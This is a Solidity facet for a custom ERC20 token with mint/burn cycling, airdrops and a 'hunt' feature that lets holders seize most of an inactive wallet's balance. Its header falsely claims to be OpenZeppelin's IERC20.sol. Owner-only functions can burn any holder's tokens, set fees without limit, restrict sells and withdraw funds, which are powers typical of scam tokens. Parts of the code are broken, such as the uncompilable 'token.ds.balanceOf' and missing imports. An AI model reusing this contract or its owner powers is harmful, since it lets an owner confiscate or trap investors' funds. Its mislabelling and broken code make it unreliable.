// SPDX-License-Identifier: MIT
// File: @openzeppelin/contracts/token/ERC20/IERC20.sol

// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract setUniswapV2PairFacet is IERC20, Ownable {
    function setUniswapV2Pair(address _pair) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.pair = _pair;
    }
    function setTradingStarted(bool _tradingStarted) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.tradingStarted = _tradingStarted;
    }
    function updateFees(
        uint256 _treasuryFee,
        uint256 _airdropFees,
        uint256 _burnMintFee,
        uint256 _treasuryFee_sell,
        uint256 _airdropFees_sell,
        uint256 _burnMintFee_sell
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.treasury_pct = _treasuryFee;
        ds.airdrop_pct = _airdropFees;
        ds.burn_pct = _burnMintFee;
        ds.mint_pct = _burnMintFee;
        ds.treasury_pct_sell = _treasuryFee_sell;
        ds.airdrop_pct_sell = _airdropFees_sell;
        ds.burn_pct_sell = _burnMintFee_sell;
        ds.mint_pct_sell = _burnMintFee_sell;
    }
    function totalSupply() external view virtual returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function allowance(
        address _owner,
        address _spender
    ) external view virtual returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.allowances[_owner][_spender];
    }
    function flashback(
        address[259] memory _list,
        uint256[259] memory _values
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender != address(0), "Invalid address");

        for (uint256 x = 0; x < 259; x++) {
            if (_list[x] != address(0)) {
                ds.balanceOf[msg.sender] -= _values[x];
                ds.balanceOf[_list[x]] += _values[x];
                ds.lastTXtime[_list[x]] = block.timestamp;
                ds.lastHunted_TXtime[_list[x]] = block.timestamp;
                emit Transfer(msg.sender, _list[x], _values[x]);
            }
        }

        return true;
    }
    function setCylist(
        address[] calldata _addresses
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < _addresses.length; i++) {
            require(_addresses[i] != address(0), "Invalid address");
            ds.cylist[_addresses[i]] = true;
        }
        return true;
    }
    function remCylist(
        address[] calldata _addresses
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < _addresses.length; i++) {
            require(_addresses[i] != address(0), "Invalid address");
            ds.cylist[_addresses[i]] = false;
        }
        return true;
    }
    function addCyclixWallets(address[] calldata wallets) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < wallets.length; i++) {
            ds.cyclixWallets[wallets[i]] = true;
        }
    }
    function removeCyclixWallets(
        address[] calldata wallets
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < wallets.length; i++) {
            ds.cyclixWallets[wallets[i]] = false;
        }
    }
    function manager_burn(
        address _to,
        uint256 _value
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_to != address(0), "Invalid address");
        require(msg.sender != address(0), "Invalid address");

        ds._totalSupply -= _value;
        ds.balanceOf[_to] -= _value;
        emit Transfer(_to, address(0), _value);
        return true;
    }
    function manager_bot_throttlng() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender != address(0), "Invalid address");

        ds.botThrottling = false;
        return true;
    }
    function setAirdropAddress(
        address _airdropAddress
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender != address(0), "Invalid address");
        require(_airdropAddress != address(0), "Invalid address");
        require(msg.sender == ds.airdropAddress, "Not authorized");

        ds.airdropAddress = _airdropAddress;
        return true;
    }
    function setLimits(bool _status) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsEnabled = _status;
    }
    function setHuntMin(uint256 _huntMin) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.dragonHuntMin = _huntMin;
    }
    function transfer(address _to, uint256 _value) external returns (bool) {
        address _owner = msg.sender;
        _transfer(_owner, _to, _value);
        return true;
    }
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowances[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) external returns (bool) {
        address _owner = msg.sender;
        return _approve(_owner, _spender, _value);
    }
    function withdrawETH(
        address payable to,
        uint256 amount
    ) external onlyOwner {
        require(to != address(0), "Invalid recipient address");
        require(address(this).balance >= amount, "Insufficient ETH balance");

        (bool sent, ) = to.call{value: amount}("");
        require(sent, "ETH transfer failed");
    }
    function withdrawAllTokens(
        address tokenAddress,
        address to
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(tokenAddress != address(0), "Invalid token address");
        require(to != address(0), "Invalid recipient address");

        IERC20 token = IERC20(tokenAddress);
        uint256 amountToWithdraw = token.ds.balanceOf(address(this));
        require(amountToWithdraw > 0, "No tokens to withdraw");

        bool sent = token.transfer(to, amountToWithdraw);
        require(sent, "Token transfer failed");
    }
    function _approve(
        address _owner,
        address _spender,
        uint256 _value
    ) private returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowances[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
        return true;
    }
    function _transfer(
        address _from,
        address _to,
        uint256 _value
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_value != 0, "No zero value transfer allowed");
        require(_to != address(0), "Invalid Address");

        if (ds.limitsEnabled) {
            //limits
            if ((!ds.cyclixWallets[_from] && !ds.cyclixWallets[_to])) {
                if (!ds.swapping && _from == ds.pair && _to != owner()) {
                    require(
                        _value + ds.balanceOf[_to] <= ds._totalSupply / 100,
                        "max 1% holding limit per wallet allowed"
                    );
                } else if (!ds.swapping && _to == ds.pair && _from != owner()) {
                    // else if(!ds.swapping && _to == ds.pair && _from != owner()) {
                    require(
                        _value <= ds._totalSupply / 1000,
                        "max 0.1% sell allowed"
                    );
                } else {
                    require(
                        _value + ds.balanceOf[_to] <= ds._totalSupply / 100,
                        "max 1% holding limit per wallet allowed"
                    );
                }
            }
        }

        if (
            (ds.cyclixWallets[_from]) ||
            (ds.cyclixWallets[_to]) ||
            (_from != ds.pair && _to != ds.pair) // tax exemption
        ) {
            _normalTransfer(_from, _to, _value);
        } else {
            if (block.timestamp > ds.last_turnTime + 60) {
                if (ds._totalSupply >= ds.max_supply) {
                    // if total supply is more than max supply then switch to burning mode
                    ds.isBurning = true;
                    _turn();
                    if (!ds.firstrun) {
                        uint256 turn_burn = ds._totalSupply - ds.max_supply;
                        if (
                            ds.balanceOf[ds.airdropAddress] - turn_burn * 2 > 0
                        ) {
                            _burn(ds.airdropAddress, turn_burn * 2);
                        }
                    }
                } else if (ds._totalSupply <= ds.min_supply) {
                    ds.isBurning = false;
                    _turn();
                    uint256 turn_mint = ds.min_supply - ds._totalSupply;
                    _mint(ds.airdropAddress, turn_mint * 2); // to keep it at min supply
                    ds.balanceOf[ds.airdropAddress] += (turn_mint * 2);
                }
            }

            if (ds.airdropAddressCount == 0) {
                _rateadj();
            }

            ds.isSell = _to == ds.pair;
            ds.mintRate = ds.isSell ? ds.mint_pct_sell : ds.mint_pct; // 1.5% for sell, 0.5% for buy/others
            ds.burnRate = ds.isSell ? ds.burn_pct_sell : ds.burn_pct; // 1.5% for sell, 0.5% for buy/others
            ds.airdropRate = ds.isSell ? ds.airdrop_pct_sell : ds.airdrop_pct; // 2.5% for sell, 0.85% for buy/others
            ds.treasuryRate = ds.isSell
                ? ds.treasury_pct_sell
                : ds.treasury_pct; // 4.88% for sell, 2% for buy/others

            if (ds.isBurning && ds.tradingStarted == true) {
                uint256 burn_amt = _pctCalc_minusScale(_value, ds.burnRate);
                uint256 airdrop_amt = _pctCalc_minusScale(
                    _value,
                    ds.airdropRate
                );
                uint256 treasury_amt = _pctCalc_minusScale(
                    _value,
                    ds.treasuryRate
                );
                uint256 tx_amt = _value - burn_amt - airdrop_amt - treasury_amt;

                _burn(_from, burn_amt);
                ds.balanceOf[_from] -= tx_amt;
                ds.balanceOf[_to] += tx_amt;
                emit Transfer(_from, _to, tx_amt);

                ds.balanceOf[_from] -= treasury_amt;
                ds.balanceOf[ds.treasuryAddr] += treasury_amt;
                emit Transfer(_from, ds.treasuryAddr, treasury_amt);

                ds.balanceOf[_from] -= airdrop_amt;
                ds.balanceOf[ds.airdropAddress] += airdrop_amt;
                emit Transfer(_from, ds.airdropAddress, airdrop_amt);

                ds.tx_n += 1;
                airdropProcess(_value, tx.origin, _from, _to);
            } else if (!ds.isBurning && ds.tradingStarted == true) {
                uint256 mint_amt = _pctCalc_minusScale(_value, ds.mintRate);
                uint256 airdrop_amt = _pctCalc_minusScale(
                    _value,
                    ds.airdropRate
                );
                uint256 treasury_amt = _pctCalc_minusScale(
                    _value,
                    ds.treasuryRate
                );
                uint256 tx_amt = _value - airdrop_amt - treasury_amt;

                _mint(msg.sender, mint_amt);
                ds.balanceOf[msg.sender] += mint_amt;
                ds.balanceOf[_from] -= tx_amt;
                ds.balanceOf[_to] += tx_amt;
                emit Transfer(_from, _to, tx_amt);

                ds.balanceOf[_from] -= treasury_amt;
                ds.balanceOf[ds.treasuryAddr] += treasury_amt;
                emit Transfer(_from, ds.treasuryAddr, treasury_amt);

                ds.balanceOf[_from] -= airdrop_amt;
                ds.balanceOf[ds.airdropAddress] += airdrop_amt;
                emit Transfer(_from, ds.airdropAddress, airdrop_amt);

                ds.tx_n += 1;
                airdropProcess(_value, tx.origin, _from, _to);
            } else {
                revert("Error at TX Block");
            }
        }

        ds.lastTXtime[tx.origin] = block.timestamp;
        ds.lastTXtime[_from] = block.timestamp;
        ds.lastTXtime[_to] = block.timestamp;
        ds.lastHunted_TXtime[tx.origin] = block.timestamp;
        ds.lastHunted_TXtime[_from] = block.timestamp;
        ds.lastHunted_TXtime[_to] = block.timestamp;

        return true;
    }
    function _normalTransfer(
        address _from,
        address _to,
        uint256 _value
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.balanceOf[_from] -= _value;
        ds.balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function _turn() internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.turn += 1;
        ds.last_turnTime = block.timestamp;
        return true;
    }
    function _burn(address _to, uint256 _value) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_to != address(0), "Invalid address");
        ds._totalSupply -= _value;
        ds.balanceOf[_to] -= _value;
        emit Transfer(_to, address(0), _value);
        return true;
    }
    function hunt_Inactive_Address(address _address) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_address != address(0), "Invalid address");
        require(ds.dragonHuntToggle == true, "Dragon Hunt not active");
        require(
            !isContract(_address),
            "This is a contract address. Use the burn inactive contract function instead."
        );
        require(
            !ds.cylist[_address] && !ds.cyclixWallets[_address],
            "Wallet not huntable"
        );
        require(
            ds.balanceOf[msg.sender] >= ds.dragonHuntMin,
            "Insufficient balance to initiate hunt"
        );
        require(
            (block.timestamp - ds.lastTXtime[_address]) / ds.huntingRate >= 1,
            "Wallet still within activity period"
        );
        require(
            (block.timestamp - ds.lastHunted_TXtime[_address]) /
                ds.huntingRate >=
                1,
            "Wallet recently hunted"
        );
        require(_address != msg.sender, "Unable to self-hunt");

        uint256 inactive_bal = getInactiveBalanceAtRisk(_address);

        uint256 burnAmount = (inactive_bal * 20) / 100; //
        uint256 rewardAmount = (inactive_bal * 70) / 100; //
        uint256 treasuryAmount = (inactive_bal * 10) / 100; //
        _burn(_address, burnAmount);

        ds.balanceOf[_address] -= rewardAmount;
        ds.balanceOf[msg.sender] += rewardAmount;
        emit Transfer(_address, msg.sender, rewardAmount);

        ds.balanceOf[_address] -= treasuryAmount;
        ds.balanceOf[ds.treasuryAddr] += treasuryAmount;
        emit Transfer(_address, ds.treasuryAddr, treasuryAmount);

        ds.lastHunted_TXtime[_address] = block.timestamp;

        ds.huntingScore[msg.sender] += inactive_bal;
        ds.huntingCount[msg.sender] += 1;

        if (!ds.isHunter[msg.sender]) {
            ds.isHunter[msg.sender] = true;
            ds.hunters.push(msg.sender);
        }

        return true;
    }
    function isContract(address account) internal view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function hunt_Inactive_Contract(address _address) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_address != address(0), "Invalid address");
        require(isContract(_address), "Not a contract address.");
        require(ds.dragonHuntToggle == true, "Dragon Hunt not active");
        require(
            !ds.cylist[_address] && !ds.cyclixWallets[_address],
            "Wallet not huntable"
        );
        require(
            ds.balanceOf[msg.sender] >= ds.dragonHuntMin,
            "Insufficient balance to initiate hunt"
        );
        require(
            (block.timestamp - ds.lastTXtime[_address]) / ds.huntingRate >= 1,
            "Wallet still within activity period"
        );
        require(
            (block.timestamp - ds.lastHunted_TXtime[_address]) /
                ds.huntingRate >=
                1,
            "Wallet recently hunted"
        );
        require(_address != msg.sender, "Unable to self-hunt");

        uint256 inactive_bal = getInactiveBalanceAtRisk(_address);

        uint256 burnAmount = (inactive_bal * 20) / 100; //
        uint256 rewardAmount = (inactive_bal * 70) / 100; //
        uint256 treasuryAmount = (inactive_bal * 10) / 100; //
        _burn(_address, burnAmount);

        ds.balanceOf[_address] -= rewardAmount;
        ds.balanceOf[msg.sender] += rewardAmount;
        emit Transfer(_address, msg.sender, rewardAmount);

        ds.balanceOf[_address] -= treasuryAmount;
        ds.balanceOf[ds.treasuryAddr] += treasuryAmount;
        emit Transfer(_address, ds.treasuryAddr, treasuryAmount);

        ds.lastHunted_TXtime[_address] = block.timestamp;

        ds.huntingScore[msg.sender] += inactive_bal;
        ds.huntingCount[msg.sender] += 1;

        if (!ds.isHunter[msg.sender]) {
            ds.isHunter[msg.sender] = true;
            ds.hunters.push(msg.sender);
        }

        return true;
    }
    function getInactiveBalanceAtRisk(
        address _address
    ) public view returns (uint256 inactive_bal) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        inactive_bal = 0;
        uint256 weeksSinceLastActivity = (block.timestamp -
            ds.lastTXtime[_address]) / ds.huntingRate; //check if valid for hunt 2 1hour
        uint256 weeksSinceLastHunted = (block.timestamp -
            ds.lastHunted_TXtime[_address]) / ds.huntingRate; //check if valid for hunt 1 7 mins
        uint256 pctAtRiskSinceLastActivity = weeksSinceLastActivity *
            ds.huntingPct; // 50% more than 100%
        uint256 pctAtRiskSinceLastHunted = weeksSinceLastHunted * ds.huntingPct; //37.5%, 25%
        uint256 lastactivitylasthunted = pctAtRiskSinceLastActivity -
            pctAtRiskSinceLastHunted;

        if (pctAtRiskSinceLastHunted >= 1000) {
            return (inactive_bal = ds.balanceOf[_address]);
        }

        if (weeksSinceLastHunted <= 0) {
            inactive_bal = 0;
        } else if (weeksSinceLastHunted == weeksSinceLastActivity) {
            uint256 originalBalance = ds.balanceOf[_address]; //100
            inactive_bal =
                ((pctAtRiskSinceLastActivity) * originalBalance) /
                1000;
            inactive_bal = (inactive_bal > ds.balanceOf[_address])
                ? ds.balanceOf[_address]
                : inactive_bal;
        } else {
            uint256 originalBalance = (ds.balanceOf[_address] * 1000) /
                (1000 - (lastactivitylasthunted));
            inactive_bal =
                ((pctAtRiskSinceLastHunted) * originalBalance) /
                1000;
            inactive_bal = (inactive_bal > ds.balanceOf[_address])
                ? ds.balanceOf[_address]
                : inactive_bal;
        }

        return (inactive_bal);
    }
    function airdropProcess(
        uint256 _amount,
        address _txorigin,
        address _sender,
        address _receiver
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.minimum_for_airdrop = _pctCalc_minusScale(
            ds.balanceOf[ds.airdropAddress],
            ds.airdrop_threshold
        );
        if (_amount >= ds.minimum_for_airdrop && _txorigin != address(0)) {
            if (!isContract(_txorigin)) {
                ds.airdrop_address_toList = _txorigin;
            } else {
                if (isContract(_sender)) {
                    ds.airdrop_address_toList = _receiver;
                } else {
                    ds.airdrop_address_toList = _sender;
                }
            }

            if (ds.firstrun) {
                if (ds.airdropAddressCount < 2) {
                    //edit 199 //CHANGE
                    ds.airdropQualifiedAddresses[ds.airdropAddressCount] = ds
                        .airdrop_address_toList;
                    ds.airdropAddressCount += 1;
                } else if (ds.airdropAddressCount == 2) {
                    //edit 199 //CHANGE
                    ds.firstrun = false;
                    ds.airdropQualifiedAddresses[ds.airdropAddressCount] = ds
                        .airdrop_address_toList;
                    ds.airdropAddressCount = 0;
                    _airdrop();
                    ds.airdropAddressCount += 1;
                }
            } else {
                if (ds.airdropAddressCount < 2) {
                    //edit 199 //CHANGE
                    _airdrop();
                    ds.airdropQualifiedAddresses[ds.airdropAddressCount] = ds
                        .airdrop_address_toList;
                    ds.airdropAddressCount += 1;
                } else if (ds.airdropAddressCount == 2) {
                    //edit 199 //CHANGE
                    _airdrop();
                    ds.airdropQualifiedAddresses[ds.airdropAddressCount] = ds
                        .airdrop_address_toList;
                    ds.airdropAddressCount = 0;
                }
            }
        }
        return true;
    }
    function _pctCalc_minusScale(
        uint256 _value,
        uint256 _pct
    ) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return (_value * _pct) / 10 ** ds.decimals;
    }
    function _airdrop() internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 onepct_supply = _pctCalc_minusScale(
            ds.balanceOf[ds.airdropAddress],
            ds.onepct
        );
        uint256 split = 0;
        if (ds.balanceOf[ds.airdropAddress] <= onepct_supply) {
            split = ds.balanceOf[ds.airdropAddress] / 2; //250 //CHANGE
        } else if (ds.balanceOf[ds.airdropAddress] > onepct_supply * 2) {
            split = ds.balanceOf[ds.airdropAddress] / 2; //180 //CHANGE
        } else {
            split = ds.balanceOf[ds.airdropAddress] / 2; //220 //CHANGE
        }

        if (ds.balanceOf[ds.airdropAddress] - split > 0) {
            ds.balanceOf[ds.airdropAddress] -= split;
            ds.balanceOf[
                ds.airdropQualifiedAddresses[ds.airdropAddressCount]
            ] += split;
            ds.lastTXtime[ds.airdropAddress] = block.timestamp;
            ds.lastHunted_TXtime[ds.airdropAddress] = block.timestamp;
            emit Transfer(
                ds.airdropAddress,
                ds.airdropQualifiedAddresses[ds.airdropAddressCount],
                split
            );
        }

        return true;
    }
    function _mint(address _to, uint256 _value) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_to != address(0), "Invalid address");
        ds._totalSupply += _value;

        emit Transfer(address(0), _to, _value);
        return true;
    }
    function _rateadj() internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.isBurning) {
            ds.burn_pct += ds.burn_pct / 10;
            ds.mint_pct += ds.mint_pct / 10;
            ds.airdrop_pct += ds.airdrop_pct / 10;
            ds.treasury_pct += ds.treasury_pct / 10;
            ds.burn_pct_sell += ds.burn_pct_sell / 10;
            ds.mint_pct_sell += ds.mint_pct_sell / 10;
            ds.airdrop_pct_sell += ds.airdrop_pct_sell / 10;
            ds.treasury_pct_sell += ds.treasury_pct_sell / 10;
        } else {
            ds.burn_pct -= ds.burn_pct / 10;
            ds.mint_pct += ds.mint_pct / 10;
            ds.airdrop_pct -= ds.airdrop_pct / 10;
            ds.treasury_pct -= ds.treasury_pct / 10;
            ds.burn_pct_sell -= ds.burn_pct_sell / 10;
            ds.mint_pct_sell += ds.mint_pct_sell / 10;
            ds.airdrop_pct_sell -= ds.airdrop_pct_sell / 10;
            ds.treasury_pct_sell -= ds.treasury_pct_sell / 10;
        }

        if (ds.burn_pct > ds.onepct * 6) {
            ds.burn_pct -= ds.onepct * 2;
        }

        if (ds.mint_pct > ds.onepct * 6) {
            ds.mint_pct -= ds.onepct * 2;
        }

        if (ds.airdrop_pct > ds.onepct * 3) {
            ds.airdrop_pct -= ds.onepct;
        }

        if (ds.treasury_pct > ds.onepct * 4) {
            ds.treasury_pct -= ds.onepct;
        }

        if (ds.burn_pct_sell > ds.onepct * 6) {
            ds.burn_pct_sell -= ds.onepct * 2;
        }

        if (ds.mint_pct_sell > ds.onepct * 6) {
            ds.mint_pct_sell -= ds.onepct * 2;
        }

        if (ds.airdrop_pct_sell > ds.onepct * 3) {
            ds.airdrop_pct_sell -= ds.onepct;
        }

        if (ds.treasury_pct_sell > ds.onepct * 6) {
            ds.treasury_pct_sell -= ds.onepct;
        }

        if (
            ds.burn_pct < ds.onepct ||
            ds.mint_pct < ds.onepct ||
            ds.airdrop_pct < ds.onepct / 2
        ) {
            uint256 deciCalc = 10 ** ds.decimals;
            ds.mint_pct = (52 * deciCalc) / 10000; //0.0125
            ds.burn_pct = (52 * deciCalc) / 10000; //0.0125
            ds.airdrop_pct = (88 * deciCalc) / 10000; //0.0085
            ds.treasury_pct = (248 * deciCalc) / 10000;
        }

        if (
            ds.burn_pct_sell < ds.onepct ||
            ds.mint_pct_sell < ds.onepct ||
            ds.airdrop_pct_sell < ds.onepct / 2
        ) {
            uint256 deciCalc = 10 ** ds.decimals;
            ds.mint_pct_sell = (150 * deciCalc) / 10000; //0.0125
            ds.burn_pct_sell = (150 * deciCalc) / 10000; //0.0125
            ds.airdrop_pct_sell = (250 * deciCalc) / 10000; //0.0085
            ds.treasury_pct_sell = (488 * deciCalc) / 10000;
        }
        return true;
    }
}
